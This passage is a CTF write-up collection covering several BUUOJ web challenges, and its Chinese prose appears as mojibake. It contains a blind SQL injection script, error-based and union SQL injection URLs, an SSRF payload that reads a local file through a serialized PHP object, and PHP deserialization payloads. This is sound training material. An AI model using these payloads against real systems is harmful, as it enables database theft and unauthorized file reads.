url = "http://08512a1f-4397-4975-aca0-31e0cee5f259.node3.buuoj.cn/index.php"
i = 0
flag = ""
payload = '0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})'

while True:
    head = 0
    tail = 127
    i += 1

    while head<tail:
        mid = (head+tail)//2
        payload = '0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})'
        data = {
            'id': payload.format(i=i,mid=mid),
        }
        # print(data)
        response = requests.post(url,data=data)
        # print(response.text)
        time.sleep(0.2)
        if "Hello" in response.text:
            head = mid + 1
        else:
            tail = mid
    flag += chr(head)
    print(flag)
    if chr(head) == '}':
        break;
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

è¿‡æ»¤å¾ˆå¤šï¼Œä½†å¯ä»¥æŠ¥é”™æ³¨å…¥

```
1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#

æŸ¥è¡¨
http://24420293-d0db-4cbf-8943-d914d0f7e029.node3.buuoj.cn/check.php?username=admin&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23
# XPATH syntax error: '~H4rDsq1~'

æŸ¥å­—æ®µ
http://24420293-d0db-4cbf-8943-d914d0f7e029.node3.buuoj.cn/check.php?username=admin&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23
#  XPATH syntax error: '~id,username,password~'
# è¿™é‡Œ substr  mid éƒ½è¿‡æ»¤äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨left right 


http://24420293-d0db-4cbf-8943-d914d0f7e029.node3.buuoj.cn/check.php?username=admin&password=1'or(updatexml(1,concat(0x7e,left((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e),1))%23
# XPATH syntax error: '~1flagflag{53026842-85f6-489a-90'

http://24420293-d0db-4cbf-8943-d914d0f7e029.node3.buuoj.cn/check.php?username=admin&password=1'or(updatexml(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e),1))%23
# XPATH syntax error: '~42-85f6-489a-906b-eb5a80616c13}'

```

## [ç½‘é¼æ¯ 2018]Fakebook

æ‰¾åˆ°æ³¨å…¥ç‚¹

```
http://783c9909-21bd-44ae-9179-2e895fbb9d39.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,4
```

![image-20210405205335225](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405205335.png)

è¿™é‡Œè¿˜çœ‹åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°ã€‚

sqlæ³¨å…¥è¿‡ç¨‹

```txt

http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=1 order by 4

http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4


http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
å¾—åˆ°    users


http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
å¾—åˆ°    no,username,passwd,data,


http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users
å¾—åˆ°  
1yanmie3ca19ee49ab62349ad1e6af2706e2e5bbc2d199e1f90e454df8c1a8339ba01befe92b6ce746a40333ba026fbfcac4db263500df84a67d60a6fe00b72ab24d12fO:8:"UserInfo":3:{s:4:"name";s:6:"yanmie";s:3:"age";i:2;s:4:"blog";s:13:"www.baidu.com";} 
```

å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œä¸å‰è¾¹çš„ååºåˆ—åŒ–å‡½æ•°å…³è”ï¼Œ

ä¿¡æ¯æ”¶é›†è¿˜å‘ç°`robots.txt` é‡Œæœ‰`user.php.bak` ,

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

å¾ˆæ˜æ˜¾ssrf

```php
<?php


class UserInfo
{
    public $name = "yanmie";
    public $age = 0;
    public $blog = "file:///var/www/html/flag.php";

}

$a = new UserInfo();
echo serialize($a);
```

payload:

```txt
http://c1f692aa-975e-40c3-afaf-23dc3bc26176.node3.buuoj.cn/view.php?no=-1 union/**/select 1,'yanmie','3ca19ee49ab62349ad1e6af2706e2e5bbc2d199e1f90e454df8c1a8339ba01befe92b6ce746a40333ba026fbfcac4db263500df84a67d60a6fe00b72ab24d12f','O:8:"UserInfo":3:{s:4:"name";s:6:"yanmie";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

## [GXYCTF2019]BabySQli

æºç 

```
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

base32:  å¤§å†™å­—æ¯+æ•°å­—

base64:  å¤§å†™å­—æ¯+æ•°å­—+å°å†™å­—æ¯

å¾—åˆ°

```sql
select * from user where username = '$name'
```

payload:

```txt
name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'--+&pw=123456
```

## ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz

```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

`if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))` é™åˆ¶ä¼ å…¥çš„å­—ç¬¦å¿…é¡»éƒ½ä¸ºå¯è§å­—ç¬¦ã€‚

ä½†æ˜¯phpåºåˆ—åŒ–`FileHandler` çš„æ—¶å€™ï¼Œå…¶ç±»å±æ€§å±æ€§å€¼ä¸º`protected` ,

> protectedå£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\0\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„\0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \0 ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\0\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚å¿…é¡»ç”¨pythonä¼ å€¼æ‰å¯ä»¥ã€‚
> ä½†æ˜¯å› ä¸ºphp7.1+å¯¹ç±»å±æ€§çš„æ£€æµ‹ä¸ä¸¥æ ¼ï¼Œå¯ä»¥ç›´æ¥ç”¨publicæ¥è¿›è¡Œåºåˆ—åŒ–

> private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ã€‚å…¶ä¸­\0 å­—ç¬¦ä¹Ÿæ˜¯è®¡ç®—é•¿åº¦çš„ã€‚

**is_valid()å‡½æ•°è§„å®šå­—ç¬¦çš„ASCIIç å¿…é¡»æ˜¯32-125ï¼Œè€Œprotectedå±æ€§åœ¨åºåˆ—åŒ–åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦\00*\00ï¼Œè½¬åŒ–ä¸ºASCIIç ä¸ç¬¦åˆè¦æ±‚ã€‚ã€‚**

#### æ–¹æ³•ï¼š

**â‘ PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥ç”¨publicå±æ€§æ¥ç»•è¿‡**

**â‘¡privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼•å…¥ä¸¤ä¸ª\x00ï¼Œæ³¨æ„è¿™ä¸¤ä¸ª\x00å°±æ˜¯asciiç ä¸º0çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹å¾—å¾ˆæ¸…æ¥šäº†ã€‚åŒç†ï¼Œprotectedå±æ€§ä¼šå¼•å…¥\x00*\x00ã€‚æ­¤æ—¶ï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿è¿›è¡Œååºåˆ—åŒ–Payloadçš„ä¼ è¾“ä¸æ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚**

**__destruct()é­”æœ¯æ–¹æ³•ä¸­ï¼Œop==="2"æ˜¯å¼ºæ¯”è¾ƒï¼Œè€Œprocess()ä½¿ç”¨çš„æ˜¯å¼±æ¯”è¾ƒop=="2"ï¼Œå¯ä»¥é€šè¿‡å¼±ç±»å‹ç»•è¿‡ã€‚**

op=2ï¼Œè¿™é‡Œçš„2æ˜¯æ•´æ•°intç±»å‹ï¼Œop=2æ—¶ï¼Œop==="2"ä¸ºfalseï¼Œop=="2"ä¸ºtrue

æƒ³è¦å†™æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æƒé™

```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    public $op=1;
    public $filename="1.txt";
    public $content="1111111111111";


}


$a = new FileHandler();
var_dump(serialize($a));

```

ä¼ payload,å›æ˜¾

```txt

Warning: file_put_contents(1.txt): failed to open stream: Permission denied in /var/www/html/index.php on line 37
[Result]:
Failed!
```

é‚£å°±åªèƒ½å°è¯•è¯»å–æ–‡ä»¶äº†ã€‚

```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    public $op=2;
    public $filename="flag.php";
    public $content="";


}


$a = new FileHandler();
var_dump(serialize($a));

```

ä¼ payloadï¼ŒæˆåŠŸæ‹¿åˆ°flag.

è¿˜æœ‰,

```
O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";s:8:"flag.php";S:10:"\00*\00content";s:0:"";}
```



